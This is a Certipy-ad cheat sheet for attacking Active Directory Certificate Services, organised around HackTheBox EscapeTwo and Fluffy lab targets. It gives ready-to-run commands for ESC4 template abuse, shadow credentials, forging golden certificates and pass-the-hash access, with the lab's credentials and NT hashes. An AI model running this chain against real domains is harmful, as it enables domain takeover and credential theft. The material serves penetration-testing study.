---
title: "Certipy-ad"
description: "pip install certipy-ad --break-system-packages"
category: active-directory
subcategory: "Tooling & Recon"
tags: ["active-directory", "kerberos", "adcs", "hashing"]
tools: ["Certipy", "BloodHound", "Evil-WinRM", "OpenSSL"]
difficulty: intermediate
updated: "2026-08-10"
source: "vault:ActiveDirectory/Certipy-ad.md"
---
# 🔐 Certipy-AD Cheat Sheet

> **A comprehensive guide for Active Directory Certificate Services enumeration and exploitation using Certipy-ad**

***

## 📋 Table of Contents

- [Overview](#-overview)
- [Installation](#-installation)
- [Common Usage Patterns](#-common-usage-patterns)
- [Command Reference](#-command-reference)
- [ESC4 Exploitation Workflow](#-esc4-exploitation-workflow)
- [HTB EscapeTwo Context](#-htb-escapetwo-context)
- [Post-Exploitation](#-post-exploitation)
- [Tips & Best Practices](#-tips--best-practices)

***

## 🎯 Overview

**Certipy-ad** is an offensive security tool designed to enumerate and exploit Active Directory Certificate Services (AD CS) misconfigurations. It supports detection and exploitation of ESC1-ESC16 vulnerabilities, making it essential for penetration testing AD environments.

### 🔑 Key Capabilities

- 🔍 **Enumeration**: Identify vulnerable certificate templates and CAs
- 🎫 **Certificate Requests**: Request certificates with custom attributes
- 🔓 **Authentication**: Use certificates for Kerberos authentication and NT hash retrieval
- 🛠️ **Template Manipulation**: Modify certificate templates to create exploitation paths
- 👤 **Shadow Credentials**: Add Key Credential Links for account takeover
- 🏆 **Golden Certificates**: Forge certificates using compromised CA keys

***

## 📦 Installation

```bash
# Install via pip
pip install certipy-ad --break-system-packages

# Install via apt (Kali Linux)
sudo apt install certipy-ad

# Verify installation
certipy-ad -h
```

***

## 💡 Common Usage Patterns

### 🔍 Enumeration Workflow

```bash
# Basic enumeration
certipy-ad find -u 'user@domain.local' -p 'password' -dc-ip 10.10.11.51

# Enumerate vulnerable templates only
certipy-ad find -u 'user@domain.local' -p 'password' -dc-ip 10.10.11.51 -vulnerable -enabled

# Output to specific format
certipy-ad find -u 'user@domain.local' -p 'password' -dc-ip 10.10.11.51 -json -output results

# Using NTLM hash authentication
certipy-ad find -u 'user@domain.local' -hashes ':NTHASH' -dc-ip 10.10.11.51
```

### 🎫 Certificate Request Workflow

```bash
# Request certificate with UPN
certipy-ad req -u 'user@domain.local' -p 'password' -ca 'CA-Name' -template 'TemplateName' -upn 'administrator@domain.local' -dc-ip 10.10.11.51

# Request using hash authentication
certipy-ad req -u 'user@domain.local' -hashes ':NTHASH' -ca 'CA-Name' -template 'TemplateName' -upn 'target@domain.local' -dc-ip 10.10.11.51

# Retrieve previously requested certificate
certipy-ad req -u 'user@domain.local' -p 'password' -ca 'CA-Name' -retrieve 123 -dc-ip 10.10.11.51
```

### 🔓 Authentication Workflow

```bash
# Authenticate using certificate
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.51

# With PFX password
certipy-ad auth -pfx administrator.pfx -password 'pfxpassword' -dc-ip 10.10.11.51

# Save in kirbi format
certipy-ad auth -pfx administrator.pfx -kirbi -dc-ip 10.10.11.51

# LDAP shell access
certipy-ad auth -pfx administrator.pfx -ldap-shell -dc-ip 10.10.11.51
```

***

## 📖 Command Reference

### 🔧 Global Flags

| Flag | Description | Example |
|------|-------------|---------|
| `-u`, `-username` | Username for authentication | `-u user@domain.local` |
| `-p`, `-password` | Password for authentication | `-p 'Password123'` |
| `-hashes` | NTLM hash (pass-the-hash) | `-hashes ':NTHASH'` or `-hashes 'LMHASH:NTHASH'` |
| `-k` | Use Kerberos authentication from ccache | `-k` |
| `-aes` | AES key for Kerberos auth | `-aes <hex_key>` |
| `-dc-ip` | Domain controller IP address | `-dc-ip 10.10.11.51` |
| `-dc-host` | 🆕 **DC hostname — REQUIRED in Certipy v5+** | `-dc-host dc01.domain.local` |
| `-target` | Target machine DNS/IP | `-target ca.domain.local` |
| `-ns` | 🆕 Nameserver for DNS resolution (pin to DC IP to avoid rerouting) | `-ns 10.10.11.51` |
| `-timeout` | Connection timeout in seconds | `-timeout 30` |
| `-debug` | Enable debug output | `-debug` |

> 🆕 **⚠️ Certipy v5 Note — Always pass `-dc-host`:** In Certipy v5+, omitting `-dc-host` causes the tool to use the domain name as the DC host and attempt a secondary DNS resolution. If that resolves to an internal AD IP that isn't routable from your VPN (`Target IP: None` in debug output), you'll get `[Errno 113] No route to host` even when your `-dc-ip` is correct and `/etc/hosts` is properly configured. **Always pair `-dc-ip` with `-dc-host`.**

***

### 1️⃣ `find` - Enumerate AD CS

**Purpose**: Discover certificate templates, CAs, and misconfigurations

```bash
certipy-ad find [options]
```

#### 📊 Key Flags

| Flag | Description |
|------|-------------|
| `-vulnerable` | Show only vulnerable templates |
| `-enabled` | Show only enabled templates |
| `-text` | Output as formatted text file |
| `-json` | Output as JSON |
| `-csv` | Output as CSV |
| `-stdout` | Output directly to console |
| `-output <prefix>` | File prefix for output |
| `-oids` | Show Issuance Policies |
| `-hide-admins` | Suppress admin permissions |
| `-dc-only` | Only collect from DC (skip CA queries) |

#### 💻 Example Commands

```bash
# Find vulnerable templates
certipy-ad find -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51 -dc-host dc01.sequel.htb -vulnerable -enabled -stdout

# Full enumeration with all outputs
certipy-ad find -u ca_svc@sequel.htb -hashes ':3b181b914e7a9d5508ea1e20bc2b7fce' -dc-ip 10.10.11.51 -dc-host dc01.sequel.htb -json -text -output dc01_enum
```

***

### 2️⃣ `req` - Request Certificates

**Purpose**: Request and retrieve certificates from AD CS

```bash
certipy-ad req [options]
```

#### 📊 Key Flags

| Flag | Description |
|------|-------------|
| `-ca <name>` | Certificate Authority name |
| `-template <name>` | Certificate template name |
| `-upn <upn>` | User Principal Name for SAN |
| `-dns <dns>` | DNS name for SAN |
| `-sid <sid>` | Object SID for SAN |
| `-subject <dn>` | Certificate subject DN |
| `-retrieve <id>` | Retrieve certificate by request ID |
| `-on-behalf-of <user>` | Request on behalf of another user |
| `-pfx <file>` | PFX for on-behalf-of or renewal |
| `-renew` | Create renewal request |
| `-out <file>` | Output PFX filename |
| `-web` | Use Web Enrollment |
| `-dcom` | Use DCOM Enrollment |

#### 💻 Example Commands

```bash
# Request certificate with custom UPN (ESC1)
certipy-ad req -u ca_svc@sequel.htb -hashes ':3b181b914e7a9d5508ea1e20bc2b7fce' \
  -ca sequel-DC01-CA -template DunderMifflinAuthentication \
  -upn administrator@sequel.htb \
  -dc-ip 10.10.11.51 -dc-host dc01.sequel.htb   # 🆕 dc-host required in v5

# Retrieve certificate by request ID
certipy-ad req -u user@domain.local -p 'password' -ca CA-Name -retrieve 42 \
  -dc-ip 10.10.11.51 -dc-host dc01.domain.local

# Request on behalf of another user (ESC2/ESC3)
certipy-ad req -u user@domain.local -p 'password' -ca CA-Name -template User \
  -on-behalf-of 'domain\administrator' -pfx user.pfx \
  -dc-ip 10.10.11.51 -dc-host dc01.domain.local
```

***

### 3️⃣ `auth` - Authenticate with Certificate

**Purpose**: Use certificates for authentication and NT hash retrieval

```bash
certipy-ad auth -pfx <cert.pfx> [options]
```

#### 📊 Key Flags

| Flag | Description |
|------|-------------|
| `-pfx <file>` | Path to certificate (PFX/P12) |
| `-password <pass>` | PFX file password |
| `-no-save` | Don't save TGT to file |
| `-no-hash` | Don't request NT hash |
| `-print` | Print TGT in kirbi format |
| `-kirbi` | Save as .kirbi instead of ccache |
| `-username <user>` | Override certificate username |
| `-domain <domain>` | Override certificate domain |
| `-ldap-shell` | Start LDAP shell after auth |

#### 💻 Example Commands

```bash
# Authenticate and retrieve NT hash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.51

# With password-protected PFX
certipy-ad auth -pfx admin.pfx -password 'pfxpass' -dc-ip 10.10.11.51

# Start LDAP shell
certipy-ad auth -pfx admin.pfx -ldap-shell -dc-ip 10.10.11.51
```

***

### 4️⃣ `template` - Manage Templates

**Purpose**: View and modify certificate template configurations

```bash
certipy-ad template -template <name> [options]
```

#### 📊 Key Flags

| Flag | Description |
|------|-------------|
| `-template <name>` | Certificate template name |
| `-save-configuration <file>` | Save current config to JSON |
| `-write-configuration <file>` | Apply config from JSON file |
| `-write-default-configuration` | Apply default ESC1 config |
| `-no-save` | Skip backup before changes |
| `-force` | Don't prompt for confirmation |

#### 💻 Example Commands

```bash
# Save template configuration
certipy-ad template -u ca_svc@sequel.htb -hashes ':HASH' -template ESC4Template \
  -save-configuration backup.json \
  -dc-ip 10.10.11.51 -dc-host dc01.sequel.htb   # 🆕

# Apply ESC1 configuration (make vulnerable)
certipy-ad template -u ca_svc@sequel.htb -hashes ':HASH' -template DunderMifflinAuthentication \
  -write-default-configuration \
  -dc-ip 10.10.11.51 -dc-host dc01.sequel.htb   # 🆕

# Restore from backup
certipy-ad template -u ca_svc@sequel.htb -hashes ':HASH' -template ESC4Template \
  -write-configuration backup.json -no-save \
  -dc-ip 10.10.11.51 -dc-host dc01.sequel.htb   # 🆕
```

***

### 5️⃣ `shadow` - Shadow Credentials

**Purpose**: Manipulate Key Credential Links for account takeover

```bash
certipy-ad shadow <action> [options]
```

#### 📊 Actions & Flags

| Action | Description |
|--------|-------------|
| `auto` | Automatically exploit (add, auth, restore) |
| `list` | List all Key Credentials |
| `add` | Add new Key Credential |
| `remove` | Remove specific Key Credential |
| `clear` | Remove all Key Credentials |
| `info` | Display detailed information |

| Flag | Description |
|------|-------------|
| `-account <target>` | Target account |
| `-device-id <guid>` | Specific device ID |
| `-out <file>` | Output certificate file |

#### 💻 Example Commands

```bash
# 🆕 Automatic shadow credential attack — FULL recommended syntax for v5
certipy-ad shadow auto \
  -u user@domain.local \
  -p 'password' \
  -account 'target_user' \
  -dc-ip 10.10.11.51 \
  -dc-host dc01.domain.local \   # ← REQUIRED in v5, prevents EHOSTUNREACH (113)
  -ns 10.10.11.51                # ← Pin DNS to DC to avoid internal IP rerouting

# List Key Credentials
certipy-ad shadow list -u user@domain.local -p 'password' -account 'target_user' \
  -dc-ip 10.10.11.51 -dc-host dc01.domain.local

# Add Key Credential
certipy-ad shadow add -u user@domain.local -p 'password' -account 'target_user' \
  -dc-ip 10.10.11.51 -dc-host dc01.domain.local
```

> 🆕 **HTB Fluffy Lesson**: `shadow auto` without `-dc-host` on Certipy v5 will print `Target IP: None` in debug mode and fail with `[Errno 113] No route to host` even with a correct `-dc-ip` and valid `/etc/hosts`. The fix is always to pass `-dc-host dc01.<domain>` explicitly.

***

### 6️⃣ `account` - Manage Accounts

**Purpose**: Create, read, update, delete AD accounts

```bash
certipy-ad account <action> -user <name> [options]
```

#### 📊 Actions & Flags

| Action | Description |
|--------|-------------|
| `create` | Create new account |
| `read` | Read account properties |
| `update` | Modify existing account |
| `delete` | Delete account |

| Flag | Description |
|------|-------------|
| `-user <name>` | SAM account name |
| `-pass <password>` | Set password |
| `-dns <hostname>` | Set DNS hostname |
| `-upn <upn>` | Set UPN |
| `-spns <spn1,spn2>` | Set SPNs |

#### 💻 Example Commands

```bash
# Create machine account
certipy-ad account create -u user@domain.local -p 'password' -user BADPC$ -pass 'MachinePass123' \
  -dc-ip 10.10.11.51 -dc-host dc01.domain.local

# Update account password
certipy-ad account update -u admin@domain.local -p 'password' -user targetuser -pass 'NewPass123' \
  -dc-ip 10.10.11.51 -dc-host dc01.domain.local
```

***

### 7️⃣ `ca` - Manage Certificate Authority

**Purpose**: Manage CA settings and certificate requests

```bash
certipy-ad ca -ca <name> [options]
```

#### 📊 Key Flags

| Flag | Description |
|------|-------------|
| `-ca <name>` | CA name |
| `-list-templates` | List enabled templates |
| `-enable-template <name>` | Enable template on CA |
| `-disable-template <name>` | Disable template on CA |
| `-issue-request <id>` | Approve pending request |
| `-deny-request <id>` | Deny pending request |
| `-add-officer <user>` | Add certificate officer |

#### 💻 Example Commands

```bash
# List enabled templates
certipy-ad ca -u user@domain.local -p 'password' -ca CA-Name -list-templates \
  -dc-ip 10.10.11.51 -dc-host dc01.domain.local

# Approve pending request
certipy-ad ca -u user@domain.local -p 'password' -ca CA-Name -issue-request 42 \
  -dc-ip 10.10.11.51 -dc-host dc01.domain.local
```

***

### 8️⃣ `forge` - Forge Certificates

**Purpose**: Create golden certificates or self-signed certs

```bash
certipy-ad forge [options]
```

#### 📊 Key Flags

| Flag | Description |
|------|-------------|
| `-ca-pfx <file>` | CA certificate/key (for golden cert) |
| `-ca-password <pass>` | CA PFX password |
| `-upn <upn>` | UPN for certificate |
| `-subject <dn>` | Certificate subject |
| `-template <file>` | Clone from template cert |
| `-out <file>` | Output PFX file |
| `-validity-period <days>` | Validity in days |

#### 💻 Example Commands

```bash
# Forge golden certificate
certipy-ad forge -ca-pfx ca.pfx -upn administrator@domain.local \
  -subject 'CN=Administrator,CN=Users,DC=domain,DC=local' -out admin_golden.pfx
```

***

### 9️⃣ `relay` - NTLM Relay

**Purpose**: Relay NTLM authentication to AD CS endpoints

```bash
certipy-ad relay -target <proto://host> [options]
```

#### 📊 Key Flags

| Flag | Description |
|------|-------------|
| `-target <proto://host>` | Target (http:// or rpc://) |
| `-ca <name>` | CA name (for RPC) |
| `-template <name>` | Certificate template |
| `-interface <ip>` | Listen interface |
| `-port <port>` | Listen port (default: 445) |
| `-forever` | Keep relay server alive |
| `-enum-templates` | Enumerate templates via relay |

***

## 🎯 ESC4 Exploitation Workflow

**ESC4** occurs when an attacker has **write permissions** over a certificate template, allowing them to modify it to become vulnerable (typically ESC1).

### 📋 Prerequisites

- ✅ Compromised account with write access to a certificate template
- ✅ Membership in groups with template modification rights (e.g., Cert Publishers)
- ✅ Access to Active Directory Certificate Services

### 🔄 Step-by-Step Exploitation

#### **Step 1: Enumerate and Identify ESC4**

```bash
certipy-ad find -u ca_svc@sequel.htb -hashes ':3b181b914e7a9d5508ea1e20bc2b7fce' \
  -dc-ip 10.10.11.51 -dc-host dc01.sequel.htb -vulnerable -stdout   # 🆕 dc-host added

# Look for output like:
# [!] Vulnerabilities
#     ESC4 : 'SEQUEL.HTB\Cert Publishers' has dangerous permissions
```

#### **Step 2: Modify Template (Certipy 5.x)**

```bash
certipy-ad template -u ca_svc@sequel.htb \
  -hashes ':3b181b914e7a9d5508ea1e20bc2b7fce' \
  -template DunderMifflinAuthentication \
  -write-default-configuration \
  -dc-ip 10.10.11.51 \
  -dc-host dc01.sequel.htb   # 🆕
```

#### **Step 3: Request Certificate with UPN**

```bash
certipy-ad req -u ca_svc@sequel.htb \
  -hashes ':3b181b914e7a9d5508ea1e20bc2b7fce' \
  -ca sequel-DC01-CA \
  -template DunderMifflinAuthentication \
  -upn administrator@sequel.htb \
  -dc-ip 10.10.11.51 \
  -dc-host dc01.sequel.htb   # 🆕

# Output: administrator.pfx
```

#### **Step 4: Authenticate and Extract Hash**

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.51
# Output: aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

#### **Step 5: Use Hash for Access**

```bash
# WinRM access
evil-winrm -i 10.10.11.51 -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff

# SMB access
smbclient -U administrator%aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff //10.10.11.51/C$

# psexec
psexec.py -hashes :7a8d4e04986afa8ed4060f75e5a0b3ff administrator@10.10.11.51
```

#### **Step 6: Restore Template (Clean Up)**

```bash
certipy-ad template -u ca_svc@sequel.htb \
  -hashes ':3b181b914e7a9d5508ea1e20bc2b7fce' \
  -template DunderMifflinAuthentication \
  -write-configuration DunderMifflinAuthentication.json \
  -no-save \
  -dc-ip 10.10.11.51 \
  -dc-host dc01.sequel.htb   # 🆕
```

***

### 🔧 Alternative Method (Certipy 4.x - Legacy)

```bash
# Step 1: Modify template (auto-saves backup)
certipy-ad template -u ca_svc -hashes :HASH \
  -dc-ip 10.10.11.51 \
  -template DunderMifflinAuthentication \
  -target dc01.sequel.htb \
  -save-old

# Step 2: Request certificate
certipy-ad req -ca sequel-DC01-CA \
  -u ca_svc -hashes :HASH \
  -dc-ip 10.10.11.51 \
  -template DunderMifflinAuthentication \
  -target dc01.sequel.htb \
  -upn administrator@sequel.htb

# Step 3: Authenticate
certipy-ad auth -pfx administrator.pfx

# Step 4: Restore (backup auto-created)
# Check for DunderMifflinAuthentication.json in current directory
```

***

## 🏆 HTB EscapeTwo Context

### 🎯 Scenario Overview

In HTB EscapeTwo, the exploitation path involves:

1. **Initial Access**: Credentials for `rose` → find SQL admin password → shell as `sql_svc`
2. **Lateral Movement**: Find `ryan` credentials → WinRM access
3. **Privilege Escalation**: `ryan` has `WriteOwner` on `ca_svc` account
4. **Account Takeover**: Use BloodyAD to take ownership and grant permissions
5. **Shadow Credentials**: Add shadow credential to `ca_svc`
6. **ESC4 Exploitation**: `ca_svc` is in Cert Publishers group → modify template → escalate to Administrator

### 🔑 Key Commands from HTB EscapeTwo

```bash
# Ownership change (using BloodyAD)
bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3' set owner ca_svc ryan
bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3' add genericAll ca_svc ryan

# Shadow credential attack — 🆕 full v5 syntax
certipy-ad shadow auto \
  -u ryan@sequel.htb \
  -p 'WqSZAF6CysDQbGb3' \
  -account 'ca_svc' \
  -dc-ip 10.10.11.51 \
  -dc-host dc01.sequel.htb \
  -ns 10.10.11.51

# ESC4 enumeration
certipy-ad find -vulnerable -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce \
  -dc-ip 10.10.11.51 -dc-host dc01.sequel.htb -stdout

# Template modification
certipy-ad template -u ca_svc@sequel.htb -hashes ':3b181b914e7a9d5508ea1e20bc2b7fce' \
  -template DunderMifflinAuthentication -write-default-configuration \
  -dc-ip 10.10.11.51 -dc-host dc01.sequel.htb

# Certificate request
certipy-ad req -u ca_svc@sequel.htb -hashes ':3b181b914e7a9d5508ea1e20bc2b7fce' \
  -ca sequel-DC01-CA -template DunderMifflinAuthentication \
  -upn administrator@sequel.htb \
  -dc-ip 10.10.11.51 -dc-host dc01.sequel.htb

# Authentication
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.51
```

***

## 🔓 Post-Exploitation

### 🎫 Using Certificates

```bash
# Pass-the-Certificate with evil-winrm
evil-winrm -i DC01 -c admin.crt -k admin.key

# Use ccache for Kerberos auth
export KRB5CCNAME=administrator.ccache
smbclient.py -k -no-pass administrator@dc01.sequel.htb

# Convert PFX to PEM for other tools
openssl pkcs12 -in admin.pfx -nocerts -out admin.key
openssl pkcs12 -in admin.pfx -clcerts -nokeys -out admin.crt
```

### 🔄 Persistence

```bash
# Renew certificate before expiration
certipy-ad req -u admin@domain.local -p 'password' -ca CA-Name -template Template \
  -renew -pfx admin.pfx -dc-ip 10.10.11.51 -dc-host dc01.domain.local

# Forge golden certificate (requires CA key)
certipy-ad forge -ca-pfx ca.pfx -upn administrator@domain.local -out golden.pfx
```

***

## 💡 Tips & Best Practices

### ⚠️ Operational Security

- 🔒 **Always backup templates** before modification
- 🧹 **Clean up** after testing (restore configurations)
- 📝 **Document** request IDs for later retrieval
- ⏰ **Note certificate validity periods** for persistence planning

### 🎯 Enumeration Tips

- 🔍 Start with `-vulnerable -enabled` for quick wins
- 📊 Use `-json` output for parsing with tools like `jq`
- 🎭 Check group memberships (Cert Publishers is key for ESC4)
- 🌐 Enumerate with BloodHound for WriteOwner/GenericAll on service accounts

### 🚀 Common Attack Chains

```
WriteOwner/GenericAll → Shadow Credentials → Hash → Certificate Request
WriteDACL → Template Modification (ESC4) → Certificate → Domain Admin
ManageCA + ManageCertificates → ESC7 → Certificate → Compromise
```

### 🔧 Troubleshooting

| Error | Cause | Solution |
|-------|-------|----------|
| `[Errno 113] No route to host` | 🆕 Certipy v5 resolves DC to internal AD IP (`Target IP: None`) instead of using `-dc-ip` | Add `-dc-host dc01.domain.local -ns <dc-ip>` to every command |
| `CERTSRV_E_TEMPLATE_DENIED` | User not authorized for template | Check enrollment rights |
| `Object SID mismatch` | Strong Certificate Mapping enabled | Use `-sid` flag |
| `INSUFF_ACCESS_RIGHTS` | Need GenericAll/WriteOwner | Check permissions |
| Connection timeout | Firewall or stale machine IP (HTB reset) | Re-verify `$TARGET`, check VPN with `ping` |
| `entryAlreadyExists` (BloodyAD) | 🆕 Object already in group — not an error | Step already complete, move on |

***

## 📚 References

- 🔗 [Certipy GitHub Wiki](https://github.com/ly4k/Certipy/wiki)
- 📄 [Certified Pre-Owned Whitepaper](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- 🎓 [HackTheBox EscapeTwo Writeup](https://0xdf.gitlab.io/2025/05/24/htb-escapetwo.html)
- 🎓 [HackTheBox Fluffy Writeup](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html) 🆕
- 🛡️ [ADCS Attack Paths - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/adcs)

***

**Created for HTB: EscapeTwo** | **Last Updated: April 2026** | **Certipy Version: 5.0.4+** 🆕

Sources
